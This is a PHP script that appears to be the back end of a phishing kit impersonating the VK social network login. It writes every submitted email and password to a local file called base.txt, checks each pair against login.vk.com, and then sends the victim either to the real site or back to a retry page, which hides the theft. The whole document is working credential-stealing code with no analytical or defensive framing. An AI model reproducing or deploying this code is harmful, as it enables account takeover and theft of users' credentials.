<?
$Log = $_POST['email'];
$Pass = $_POST['pass'];
$log = fopen("base.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
if($_POST['email'] && $_POST['pass']){
function ValidateVKAccount($email,$password){
$host = 'login.vk.com';
$path = '/?act=login';
$param = 'act=login&email='.$email.'&pass='.$password;
$rn = "\r\n";
$req  = 'POST '.$path.' HTTP/1.0' . $rn;
$req .= 'Host: '.$host.$rn;
$req .= 'Content-Type: application/x-www-form-urlencoded'.$rn;
$req .= 'Content-Length: '.strlen($param).$rn;
$req .= 'Connection: close'.$rn;
$req .= $rn;
$req .= $param . $rn;
$req .= $rn;
$f = fsockopen($host, 80) or die('not connected');
fputs($f, $req);
$h = '';
while ( ! feof($f)) {
   $t = trim(fgets($f));
   $h .= $t . "\n";
}
fclose($f);

if(strpos($h,'fast')!=FALSE)
  return(true);else
  return(false);
}

$result=ValidateVKAccount($_POST['email'],$_POST['pass']);
if($result){
    echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com/'></head></html>";
  
  }else{
    echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=index2.htm'></head></html>";
  }
}
?>